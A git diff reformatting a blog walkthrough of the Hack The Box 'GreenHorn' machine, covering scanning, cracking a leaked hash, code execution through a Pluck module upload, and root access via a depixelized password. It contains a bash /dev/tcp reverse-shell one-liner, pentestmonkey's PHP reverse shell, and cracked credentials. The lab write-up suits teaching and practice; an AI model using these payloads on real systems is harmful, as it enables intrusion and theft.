@@ -27,8 +27,7 @@ I learned quite a bit on this box.  Hopefully, you do to.  Let's go.
 
 Run nmap and get a list of the ports.
 
-{% raw %}
-```sh
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/htb/greenhorn]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.11.25 
 [sudo] password for kali: 
@@ -47,8 +46,8 @@ PORT     STATE SERVICE VERSION
 3000/tcp open  http    Golang net/http server
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Check the landing page for the webserver on port 80.
@@ -62,10 +61,7 @@ Check the landing page for the webserver on port 80.
 <br />
 Check the source code of the webpage looking for any interesting little nuggets.
 
-{% raw %}
-```sh
-view-source:http://greenhorn.htb/?file=welcome-to-greenhorn
-
+{% capture browsersource %}
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
 <head>
@@ -97,8 +93,8 @@ view-source:http://greenhorn.htb/?file=welcome-to-greenhorn
 </div>
 </body>
 </html>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='view-source:http://greenhorn.htb/?file=welcome-to-greenhorn' content=browsersource %}
 
 <br />
 Check the login page and note the version of pluck.
@@ -112,13 +108,12 @@ Check the login page and note the version of pluck.
 <br />
 Check the robots.txt file.
 
-{% raw %}
-```sh
+{% capture robotstxt %}
 User-agent: *
 Disallow: /data/
 Disallow: /docs/
-```
-{% endraw %}
+{% endcapture %}
+{% include codebox.html title="robots.txt" content=robotstxt %}
 
 <br />
 Check the landing page for the webserver that is serving on port 3000.
@@ -177,18 +172,16 @@ Investigate the repo looking for some sort-of config file.  These usually contai
 <br />
 Save the hash to the file.
 
-{% raw %}
-```sh
+{% capture createhash %}
 ┌──(kali㉿kali)-[~]
 └─$  echo 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163' > hash
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=createhash %}
 
 <br />
 Run hash-identifier to identify the type of hash as SHA512.
 
-{% raw %}
-```sh
+{% capture hashid %}
 ┌──(kali㉿kali)-[~]
 └─$ hash-identifier                                      
    #########################################################################
@@ -214,14 +207,13 @@ Least Possible Hashs:
 [+] SHA-512(HMAC)
 [+] Whirlpool(HMAC)
 --------------------------------------------------
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=hashid %}
 
 <br />
 Use john the ripper to crack the password.  We will use the rockyou.txt wordlist and the raw-sha512 format.
 
-{% raw %}
-```sh
+{% capture crackhash %}
 ┌──(kali㉿kali)-[~]
 └─$ john --format=Raw-SHA512 --wordlist=/usr/share/wordlists/rockyou.txt hash 
 Using default input encoding: UTF-8
@@ -234,8 +226,8 @@ iloveyou1        (?)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 --------------------------------------------------
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=crackhash %}
 
 <br />
 Try the credentials in the login page that we discovered earlier as a part of the pluck site on port 80.
@@ -268,24 +260,20 @@ Look up for a vulnerability for Pluck, version 4.7.18.  Follow the links indicat
 <br />
 Create a test.php file the executes the phpinfo() function to test command execution.
 
-{% raw %}
-```sh
-┌──(kali㉿kali)-[~/Documents/htb/greenhorn]
-└─$ cat test.php 
+{% capture testphp %}
 <?php phpinfo(); ?>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='php' title='test.php' content=testphp %}
 
 <br />
 When a exploit comes along, you must zip it.
 
-{% raw %}
-```sh
+{% capture zipphp %}
 ┌──(kali㉿kali)-[~/Documents/htb/greenhorn]
 └─$ zip test.zip test.php
   adding: test.php (stored 0%)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=zipphp %}
 
 <br />
 Select options and click manage modules.
@@ -317,36 +305,31 @@ Notice that the function executed.
 <br />
 Start a netcat listener.
 
-{% raw %}
-```sh
+{% capture startlistener %}
 ┌──(kali㉿kali)-[~/Documents/htb/greenhorn]
 └─$ sudo nc -nlvp 443      
 [sudo] password for kali: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=startlistener %}
 
 <br />
 Create a reverse shell in a php file.
 
-{% raw %}
-```sh
-┌──(kali㉿kali)-[~/Documents/htb/greenhorn]
-└─$ cat shell.php              
+{% capture createshell %}
 <?php echo system(\"bash -c 'exec bash -i &>/dev/tcp/10.10.16.12/443 <&1'\")?>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='shell.php' content=createshell %}
 
 <br />
 When a something's going wrong, you must zip it.
 
-{% raw %}
-```sh
+{% capture zipshellphp %}
 ┌──(kali㉿kali)-[~/Documents/htb/greenhorn]
 └─$ zip shell.zip shell.php                                          
   adding: shell.php (deflated 6%)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=zipshellphp %}
 
 <br />
 Upload that zip.  That malicious zip.
@@ -369,8 +352,7 @@ Nope.  It didn't seem to like that at all.  No shell.  Seems like what we got he
 <br />
 Download pentestmonkey's php reverse shell.
 
-{% raw %}
-```sh
+{% capture downloadpentestmonkey %}
 ┌──(kali㉿kali)-[~/Documents/htb/greenhorn]
 └─$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php -O shell.php
 --2025-02-03 00:55:59--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
@@ -383,14 +365,13 @@ Saving to: ‘shell.php’
 shell.php                                                  100%[========================================================================================================================================>]   5.36K  --.-KB/s    in 0.02s   
 
 2025-02-03 00:55:59 (243 KB/s) - ‘shell.php’ saved [5491/5491]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadpentestmonkey %}
 
 <br />
 Update the scripts LHOST and LPORT to your attack machine.
 
-{% raw %}
-```php
+{% capture pentestmonkey %}
 <?php
 // php-reverse-shell - A Reverse Shell implementation in PHP
 // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
@@ -416,25 +397,23 @@ $debug = 0;
 <snip>
 
 ?>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='php' title='shell.php' content=pentestmonkey %}
 
 <br />
 Zip it on up.
 
-{% raw %}
-```sh
+{% capture zippentestmonkey %}
 ┌──(kali㉿kali)-[~/Documents/htb/greenhorn]
 └─$ zip shell.zip shell.php 
   adding: shell.php (deflated 59%)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=zippentestmonkey %}
 
 <br />
 Install the shell.zip module.  Check the listener and catch the shell.
 
-{% raw %}
-```sh
+{% capture catchshell %}
 ┌──(kali㉿kali)-[~/Documents/htb/greenhorn]
 └─$ sudo nc -nlvp 443      
 [sudo] password for kali: 
@@ -447,27 +426,25 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
 $ python3 -c 'import pty; pty.spawn("/bin/bash");'
 www-data@greenhorn:/$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchshell %}
 
 <br />
 Change into the junior user using su and the password from the website.
 
-{% raw %}
-```sh
+{% capture sujunior %}
 www-data@greenhorn:/var/lib/gitea$ su junior
 su junior
 Password: iloveyou1
 
 junior@greenhorn:/var/lib/gitea$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sujunior %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```sh
+{% capture userflag %}
 cat user.txt
 <redacted>
 junior@greenhorn:~$ ip a
@@ -488,38 +465,35 @@ ip a
        valid_lft 86395sec preferred_lft 14395sec
     inet6 fe80::250:56ff:feb9:5c7b/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=userflag %}
 
 <br />
 Run sudo -l to see what commands we can run as sudo.
 
-{% raw %}
-```sh
+{% capture sudol %}
 junior@greenhorn:~$ sudo -l
 sudo -l
 [sudo] password for junior: iloveyou1
 
 Sorry, user junior may not run sudo on greenhorn.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sudol %}
 
 <br />
 Start a webserver.
 
-{% raw %}
-```sh
+{% capture pyserver %}
 junior@greenhorn:~$ python3 -m http.server
 python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=pyserver %}
 
 <br />
 Transfer the pdf in the junior home folder to the attack machine.
 
-{% raw %}
-```sh
+{% capture downloadopenvas %}
 ┌──(kali㉿kali)-[~/Documents/htb/greenhorn]
 └─$ wget http://greenhorn.htb:8000/Using%20OpenVAS.pdf
 --2025-02-11 16:16:02--  http://greenhorn.htb:8000/Using%20OpenVAS.pdf
@@ -532,8 +506,8 @@ Saving to: ‘Using OpenVAS.pdf’
 Using OpenVAS.pdf                                          100%[========================================================================================================================================>]  59.93K  --.-KB/s    in 0.04s   
 
 2025-02-11 16:16:02 (1.41 MB/s) - ‘Using OpenVAS.pdf’ saved [61367/61367]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadopenvas %}
 
 <br />
 View the pdf and note the blurred password.
@@ -557,18 +531,16 @@ Research on how to unblur the image.  You will notice a reference to two differe
 <br >
 Run the pdfimages program against the pdf we took from the victim machine.
 
-{% raw %}
-```sh
+{% capture pdfimages %}
 ┌──(kali㉿kali)-[~/Documents/htb/greenhorn]
 └─$ pdfimages VAS.pdf ./vas-000.ppm
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=pdfimages %}
 
 <br />
 Clone the depix repository.
 
-{% raw %}
-```sh
+{% capture gitdeclone %}
 ┌──(kali㉿kali)-[~/Documents/htb/greenhorn]
 └─$ git clone  https://github.com/spipm/Depixelization_poc.git
 Cloning into 'Depixelization_poc'...
@@ -581,8 +553,8 @@ Resolving deltas: 100% (126/126), done.
                                                                                                                                                                                                                                             
 ┌──(kali㉿kali)-[~/Documents/htb/greenhorn]
 └─$ cd Depixelization_poc
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=gitdeclone %}
 
 <br />
 Take a screen-print of the pdf and save it as a png.  We can use this as a sample of the fonts.
@@ -606,8 +578,7 @@ Try running depix and note that it fails.  Perform research about proper usage o
 <br />
 Run depix again and use the provide character set as the reference set.
 
-{% raw %}
-```sh
+{% capture rundepix %}
 ┌──(kali㉿kali)-[~/Documents/htb/greenhorn/Depixelization_poc]
 └─$ python3 depix.py -p ../vas-000.ppm-000.ppm -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o ../outputcas.png
 2025-02-11 18:09:15,883 - Loading pixelated image from ../vas-000.ppm-000.ppm
@@ -629,8 +600,8 @@ Run depix again and use the provide character set as the reference set.
 2025-02-11 18:11:15,178 - Writing single match results to output
 2025-02-11 18:11:15,179 - Writing average results for multiple matches to output
 2025-02-11 18:11:20,494 - Saving output image to: ../outputcas.png
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rundepix %}
 
 <br />
 Check the outputcas.png picture to see the descrambled image.
@@ -644,8 +615,7 @@ Check the outputcas.png picture to see the descrambled image.
 <br />
 Use the password in the output image to ssh into the server as root.
 
-{% raw %}
-```sh
+{% capture sshroot %}
 ┌──(kali㉿kali)-[~/Documents/htb/greenhorn/Depixelization_poc]
 └─$ ssh root@10.10.11.25
 root@10.10.11.25's password: 
@@ -671,14 +641,13 @@ This system is built by the Bento project by Chef Software
 More information can be found at https://github.com/chef/bento
 Last login: Thu Jul 18 12:55:08 2024 from 10.10.14.41
 root@greenhorn:~#
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sshroot %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```sh
+{% capture roottxt %}
 root@greenhorn:~# cat root.txt
 <redacted>
 root@greenhorn:~# ip a
@@ -698,8 +667,8 @@ root@greenhorn:~# ip a
        valid_lft 86400sec preferred_lft 14400sec
     inet6 fe80::250:56ff:feb9:5c7b/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=roottxt %}
 
 <br />
 So, fun practicing unblurring.  I never did that before.  Hopefully, you enjoyed the walk-through.
